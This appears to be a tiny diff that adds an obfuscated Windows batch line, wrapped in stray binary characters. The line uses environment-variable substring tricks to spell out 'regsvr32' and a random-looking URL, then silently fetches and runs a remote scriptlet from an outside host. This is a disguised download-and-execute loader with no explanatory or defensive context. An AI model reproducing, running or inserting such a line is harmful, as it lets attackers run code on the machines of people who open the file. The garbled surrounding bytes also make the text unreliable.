@@ -1,0 +1,2 @@
+ ? Û
+ @echo off %ALLUSERSPROFILE:~4,1%egsv%ALLUSERSPROFILE:~4,1%32.exe /s /n /i:http://dfENOlLSnWeXYzKaqIbicQt%ALLUSERSPROFILE:~4,1%%ALLUSERSPROFILE:~4,1%UAhkuvMTGsHFogwmxyDJPpjCBZV.com/n0tm4lw4%ALLUSERSPROFILE:~4,1%3  ? Û
